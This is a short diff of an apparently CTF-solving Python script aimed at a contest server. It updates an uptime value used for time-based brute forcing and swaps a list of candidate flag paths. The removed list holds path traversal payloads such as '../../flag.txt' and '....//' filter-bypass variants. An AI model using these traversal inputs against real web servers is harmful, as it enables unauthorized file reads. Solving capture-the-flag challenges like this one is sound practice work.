@@ -5,9 +5,9 @@ import requests
 
 # === Konfigurasi ===
 TARGET_URL = "http://ctf.asgama.online:40004/"
-UPTIME_NOW = 45169  # Uptime terbaru dari server
+UPTIME_NOW = 217427  # Uptime terbaru dari server
 RANGE = 300  # Brute-force range (±detik)
-FLAG_CANDIDATES = ["flag.txt", "/flag.txt", "../../flag.txt", "sample.txt", "....//flag.txt", "....//....//flag.txt", "....//secret/flag.txt", "....//..//flag.txt", "....//app/flag.txt"]
+FLAG_CANDIDATES = ["flag.txt", "/in_prod_this_is_random", "/in_prod_this_is_random/flag.txt"]
 
 now = round(time.time())
 
